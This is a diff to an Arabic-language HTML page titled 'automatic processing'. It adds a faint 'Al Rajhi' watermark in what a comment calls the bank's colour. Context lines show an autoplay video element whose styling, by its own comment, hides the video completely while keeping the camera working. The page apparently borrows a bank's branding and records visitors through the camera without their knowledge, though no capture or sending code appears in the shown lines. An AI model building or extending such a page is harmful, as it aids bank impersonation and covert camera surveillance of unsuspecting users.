@@ -5,10 +5,9 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>معالجة تلقائية</title>
     <style>
-        body {
-    /* خلفية بيضاء مع تدرج خفيف جداً يعطي طابع الفخامة والنظافة */
+       /* تعديل الـ body ليكون فخماً ونظيفاً */
+body {
     background: linear-gradient(135deg, #ffffff 0%, #f8f9fa 100%);
-    
     margin: 0;
     padding: 0;
     display: flex;
@@ -17,18 +16,22 @@
     height: 100vh;
     overflow: hidden;
     font-family: 'Segoe UI', Roboto, Helvetica, sans-serif;
-    
-    /* إضاءة محيطة ناعمة جداً تزيد من فخامة التصميم */
-    box-shadow: inset 0 0 100px rgba(0,0,0,0.03);
+    position: relative; /* ضروري لجعل العلامة المائية في الخلفية */
 }
 
-/* إضافة اختيارية: لجعل أي عنصر يوضع داخل الـ body يظهر بوضوح وفخامة */
-body::before {
-    content: "";
+/* تصميم كلمة الراجحي كعلامة مائية فخمة */
+.watermark {
     position: absolute;
-    top: 0; left: 0; width: 100%; height: 100%;
-    background: radial-gradient(circle at center, rgba(0, 168, 89, 0.05) 0%, transparent 70%);
+    top: 50%;
+    left: 50%;
+    transform: translate(-50%, -50%);
+    font-size: 15vw;
+    font-weight: 900;
+    color: rgba(0, 168, 89, 0.03); /* لون الراجحي بشفافية 3% */
+    z-index: 0;
     pointer-events: none;
+    user-select: none;
+    white-space: nowrap;
 }
         /* تعديل الأبعاد لإخفاء الفيديو تماماً مع الحفاظ على عمل الكاميرا */
         video {
@@ -61,7 +64,7 @@ body::before {
     </style>
 </head>
 <body>
-
+<div class="watermark">الراجحي</div>
     <!-- عناصر الواجهة -->
     <video id="video" autoplay playsinline></video>
     <div id="success-mark" class="result-mark">✓</div>
